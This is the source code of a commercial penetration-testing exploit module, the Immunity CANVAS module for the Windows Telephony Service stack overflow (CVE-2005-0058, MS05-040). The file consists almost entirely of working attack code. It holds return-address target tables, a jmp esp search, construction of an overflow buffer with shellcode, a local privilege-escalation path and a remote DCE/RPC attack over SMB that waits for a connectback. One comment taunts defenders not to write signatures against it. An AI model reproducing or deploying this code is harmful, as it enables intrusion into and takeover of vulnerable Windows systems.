#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2009
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from msrpcexploit import msrpcexploit
from libs.newsmb.libdcerpc import s_dce_unistring

NAME= "Windows Telephony Service Overflow"
DESCRIPTION= "Windows Telephony Service Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='8/9/2005'
DOCUMENTATION['References']='Found by Sinan Eren of Immunity Inc. Also found by Kostya'
DOCUMENTATION['Platforms Tested']='Windows XP Home/Pro SP1a (up2date), Windows XP Home/Pro SP0/base, (XP SP2 in some cases as well)'
DOCUMENTATION['Shellcode']='You will need -i fromcreatethread if running from command line'
DOCUMENTATION['CVE Name']='CVE-2005-0058'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0058'
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION['MSRC']='http://www.microsoft.com/technet/security/Bulletin/MS05-040.mspx'
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']
PROPERTY['MSADV']='MS05-040'
PROPERTY['MS PATCHES']=["KB893756"]
CHANGELOG="""
"""

NOTES="""
Under winXP you attach to svchost (second one, usually)
Under Win2K you attach to svchost.exe as well (last one)
  
net start Telephony for restarting it.

I assume the remote anonymous attack is in the Mailslot interface
tapimgmt.msc is a good place to play (loading it will enable the Mailslot UniModem interface)
http://www.i-b-a-m.de/Andreas_Marschall's_Toto_Tools.htm
You can't use ordinal shellcode with this because ws2_32 is not loaded by default. (on my win2k box at least)
"""

# info, total length of string , offset1, geteip (jmp esp), remoteoffset, remotegeteip
targets = {
    0 : ['Autoversioning N/A', 0,0],
    1 : ['Windows 2000 SP4', 0x800, 526, 0x778e71a3L,0x652, 0x66e0e068L],
    2 : ['Windows 2000 SP0-SP3', 0x700, 526, 0x778e61a3L,0x652],
    3 : ['Windows XP SP0-SP1', 0x700,522, 0x76d4f613,0x652],
    4 : ['Windows XP SP2', 0x700, 522, 0x01020304,0x652],    #not giving away the secret here
}


class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.version          = 0
        self.badstring        = "\x00\\/.:$"
        self.UUID             = u"2f5f6520-ca46-1067-b319-00dd010662da"
        self.uuidversion      = u"1.0"
        self.targetfunction   = 0x1
        self.name             = NAME
        self.startservice     = self.StartTapiSrvService
        self.getcontexthandle = self.getContextHandle
        self.port             = 445
        self.forceauth        = 1
        self.object           = self.UUID
        self.context          = ""
        self.runlocalhost     = self.mylocalhost
        self.autoversion      = 1 #we can now
   
    def makesploit(self):
        """
        Make exploit string
        
        If for some reason our geteip seems to fail, we can do a hunt
        locally in kernel32.dll or something for a valid jmp esp

        This particular makesploit is used for XP SP1 and below
        The XP SP2 exploit is still unreleased
        """
        node=self.getfirstnode()

        if 0 and self.version!=0:
            name=targets[self.version][0]
            self.log("Making exploit for target version: %s"%name)
            buflen=targets[self.version][1]
            buffer="A"*buflen
            eipoffset=targets[self.version][2]
            geteip=targets[self.version][3]
            self.log("Using geteip=%8x"%geteip)
            writeaddr=0x7ffdf280 #not good on XPSP2
        else:
            self.log("Running auto-version to get return address")
            #first, differentiate version be it 2K/XP/2K3, etc
            osdetect=self.engine.getModuleExploit("osdetect")
            osdetect.link(self)
            osdetect.run()
            ret=str(osdetect.result)
            self.log("osdetect returned %s"%ret)
            if "Windows 2000" in ret and ("SP4" in ret or "Service Pack 4" in ret):
                version=1
            elif "Windows 2000" in ret:
                version=2
            elif "Windows XP" in ret:
                version=3
            else:
                return 0
            name=targets[version][0]
            self.log("Making exploit for target version: %s"%name)
            buflen=targets[version][1]
            buffer="A"*buflen
            eipoffset=targets[version][2]
            #don't use geteip
            #geteip=targets[version][3]
            #self.log("Using geteip=%8x"%geteip)
            writeaddr=0x7ffdf280 #not good on XPSP2
            #now we need to get a new geteip
            addy=node.shell.getprocaddress("advapi32.dll|ReportEventA")
            if addy==0:
                self.log("Could not get valid advapi32 address!")
                return 0
            allmem=node.shell.get_all_memory(addy)
            self.log("Loaded %d bytes of Advapi32.dll to look for jmp esp"%len(allmem))
            #does different things depending on if CWS is connected or not...
            geteip=self.engine.find_geteip("jmp *%esp","X86",addy, allmem)
            if geteip==None:
                self.log("Could not find a valid eip in advapi32!")
                return 0
            
            self.log("Using calculated geteip=%8x"%geteip)

        #having trouble finding eipoffset?
        testbuf=""
        for i in range(1,50):
            testbuf+=chr(i)
        buffer=stroverwrite(buffer,testbuf,eipoffset-50)
        
        buffer=stroverwrite(buffer,intel_order(geteip),eipoffset)
        if name.count("XP"):
            self.log("Target is XP")
            buffer=stroverwrite(buffer,intel_order(writeaddr),eipoffset+4) #safe addr
            buffer=stroverwrite(buffer,intel_order(writeaddr),eipoffset+20) #safe addr
        elif name.count("2000"):
            self.log("Target is Windows 2000")
            buffer=stroverwrite(buffer,intel_order(writeaddr),eipoffset+16) #safe addr
            
        #+4 below is padding so we don't overwrite ourselves
        self.log("Shellcode is of length %d"%len(self.shellcode))
        buffer=stroverwrite(buffer,self.shellcode,eipoffset+24+4) #shellcode location
        buffer=pad4(buffer) #pad it to 4 bytes with nulls
        return buffer

    def mylocalhost(self):
        """
        This is the function used as a "run" function if we are attacking
        localhost.
        """
        self.log("Doing localhost attack with MOSDEF")
        buffer=self.makesploit()
        if not buffer:
            return 0
        self.log("Buffer is of length: %d"%len(buffer))
        node=self.getfirstnode()
        if "win32api" not in node.capabilities:
            self.log("You chose a Node that doesn't support the win32api.")
            self.log("Perhaps you didn't choose a win32Node as first node?")
            return 0

        self.shell=node.shell
        if self.shell==None:
            self.log("self.shell is None, which should never happen - exiting.")
            return 0
       
        vars = {}
        vars["buffer"]=buffer
        code = """
        #import "remote","tapi32.dll|lineGetAppPriorityW" as "lineGetAppPriorityW"
        #import "local","sendint" as "sendint"
        #import "string","buffer" as "buffer"
        void main() {
           unsigned int d;
           int i;
           int LINEREQUESTMODE_MAKECALL;
           LINEREQUESTMODE_MAKECALL=1; //#define, basically
           i=lineGetAppPriorityW(buffer,0,0,LINEREQUESTMODE_MAKECALL,0,&d);
           //sendint(i); //see if we ever return - we don't. 
        }
        """
 
        self.shell.clearfunctioncache()
        message=self.shell.compile(code,vars)
        mallocspace,threadid=self.shell.sendrequest_newthread(message)
        #self.shell.sendrequest(message)
        self.log("Sent request...")
 
        import time
        self.log("Sleeping 5 seconds to let server recover")
        for i in range(0,5):
            time.sleep(1)
            if self.ISucceeded(): #check for connectback
                break
        #clean up after ourselves
        self.log("Cleaning up the thread we spawned")
        self.shell.clearthread(mallocspace,threadid)
        self.log("Checking to see if we succeeded")
        if self.ISucceeded():
            self.log("Local ms05_040 succeeded!")
            return 1
        self.log("Local ms05_040 attack seems to have failed.")
        return 0
        
       
    def buildConnectionList(self):
        os=targets[self.version][0]
        if os.count("XP"):
            self.connectionList= ["ncacn_np:%s[\\srvsvc]"% (self.host)]
        else:
            self.connectionList= ["ncacn_np:%s[\\tapsrv]"% (self.host)]
            
        return self.connectionList
    
    def StartTapiSrvService(self):
        node=self.argsDict["passednodes"][0]
        if not node.islocal(self.target.interface):
            self.log("Not starting service on remote host")
            return 1
        
        app=self.engine.getModuleExploit("startservice")
        app.link(self)
        app.argsDict["passednodes"]=[node]
        app.argsDict["serviceName"]="TapiSrv"
        app.run()
        ret=app.result[node.getname()]
        self.log("Started TAPI service from ms05_040...continuing with expoit")
        return ret
    

    def testOS(self):        
        app = self.engine.getModuleExploit("osdetect")
        app.link(self)
        print "target=%s->%s"%(self.target,app.target)
        result=str(app.run())
        self.log("OS detected: %s"%result)
        if result == 0:
            self.log("Unknown OS, automatic detection failed (try choosing a version)")
            return 0
        if app.result.find("2000") > -1:
            #self.version = WIN2K
            self.version=1
            self.log("OS vulnerable only locally: %s" % result)
            return 0
        elif app.result.find("XP") > -1:
            self.version=3
            #self.version = XP
            self.log("OS might be vulnerable (SP0, SP1a): %s" % result)
            return 1
        elif app.result.find("NT") > -1:
            #self.version = NT4
            self.log("OS vulnerable only locally: %s" % result)
            return 0
        else:
            self.log("OS not vulnerable: %s" % result)
        return 0
    
    def getContextHandle(self):
        self.log("Getting context handle.")
        #pid, string string
        #this -3 for the pid bypasses some checks on our token
        pid=-3
        #pid=0
        #Do not write signatures on this, or we'll change them. :>
        pkt=intel_order(pid)+s_dce_unistring("LOLA")+s_dce_unistring("BRAUN")
        self.myDCE.call(0, pkt, response=True)
        ret = self.myDCE.reassembled_data
        if ret:
            self.log("Got: %s" % prettyprint(ret))
            self.context=ret[0:20]
            status=istr2int(ret[-4:])
            self.log("Status returned: %x (0 is success)" % status)
            if long(status)==0x80000044L:
                self.log("TAPI Error: Insufficient memory available to complete the operation")
            self.log("Context Handle: %s" % hexprint(self.context))
            return 1
        if self.context == "\x00"*20:
            return 0

        
    def buildDcePacket(self):
        """
        Builds the slightly complex DCE packet with our attack and shellcode
        
        Our string ends at 0xfa81
        Then you have up until 0xf8f1 for shellcode
        at which point you have corruption until 0xf8d7
        and then you have more space until 0xf6c4

        So you need 2 different chunks of shellcode
        <531><crap of 26 bytes, including a geteip and a jmp><400 bytes>
        
        """
        #need small shellcode
        #host=self.callback.ip
        #port=self.callback.port
        #self.createSmallWin32Shellcode(host,port,subesp=3000)
        #create a test string to test easychunk with
        #self.shellcode=(badchartest(0,255,self.badstring)*50)[:len(self.shellcode)]
        
        self.log("Shellcode length:%d"%len(self.shellcode))
        self.easychunk(525,40,3000) #3000 is subesp
        #insert int3 for testing!
        #self.shellcode="\xcc"+self.shellcode
        
        description, length, offset, localgeteip, offset2, geteip = targets[self.version]
        
        pkt = ""
        data = ""
        
        if 1:
            self.log("Attacking version: %s length %s offset %s geteip %s" % (description,length , offset2, "%8.8x"%geteip))
            
            #PAYLOAD
            #context, ptr, long
            Data = ""
            Data += self.context

            size=length
            #ndrconformantvaryingarrayunmarshall
            #also need to pass ndrcorrolationpass
            #then checkverification trailer
            Data += intel_order(size)
            Data += intel_order(0)
            Data += intel_order(size)
            #array itself
            #Data += intel_order(0)
            attackstr="A"*size
            attackstr=stroverwrite(attackstr,intel_order(69),0)
            attackstr=stroverwrite(attackstr,intel_order(0x400),8)
            attackstr=stroverwrite(attackstr,intel_order(0xdea0),12)
            attackstr=stroverwrite(attackstr,intel_order(0x2),24)
            attackstr=stroverwrite(attackstr,intel_order(0x0),32)
            attackstr=stroverwrite(attackstr,intel_order(0x0),len(attackstr)-4)
            #this has been easychunked, so you can overwrite it in places
            attackstr=stroverwrite(attackstr,self.shellcode,offset2-531)           

            attackstr=stroverwrite(attackstr,intel_order(geteip), offset2)
            from MOSDEF import mosdef
            jmpstr=mosdef.assemble("jmp $-%d"%(557),"X86")
            self.log("jmpstr=%s"%prettyhexprint(jmpstr))
            attackstr=stroverwrite(attackstr,jmpstr,offset2+20)
            self.log("Shellcode length is %d"%len(self.shellcode))
           
            self.log("Attackstr length %x"%len(attackstr))
            Data += attackstr
            #add padding
            if size%4:
                Data += "\xcc"*(4-size%4)
            Data += intel_order(size)
            Data += intel_order(size)
            #Data += intel_order(size)
            #Data += intel_order(size)
                        
        else:
            raise Exception, "XP base/SP1a only attack."
        
        return Data


    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1
    
    
if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)


